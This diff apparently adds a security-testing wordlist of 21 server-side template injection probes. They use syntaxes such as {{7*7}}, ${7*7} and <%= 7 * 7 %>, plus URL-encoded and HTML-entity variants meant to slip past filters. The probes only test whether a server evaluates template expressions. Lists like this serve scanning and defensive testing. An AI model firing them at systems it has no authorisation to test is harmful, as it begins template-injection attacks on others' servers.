@@ -1,0 +1,21 @@
+ssti{{7*7}}
+ssti[[7*7]]
+ssti}}{{7*7}}
+ssti{{40+'9'}}
+ssti<%= 7 * 7 %>
+ssti${7*7}
+ssti${{7*7}}
+ssti@(40+9)
+ssti#{7*7}
+ssti#{ 7 * 7 }
+ssti<%=%207%20*%207%20%>
+ssti#{%207%20*%207%20}
+ssti{7*7}
+ssti%7b%7b7*7}}
+ssti&#123;&#123;7*7}}
+ssti&#x0007B;&#x0007B;7*7}}
+ssti&lcub;&lcub;7*7}}
+ssti&lbrace;&lbrace;7*7}}
+ssti{{7*7}}[[7*7]]
+ssti{{7*7}}
+ssti{{7*'7'}}
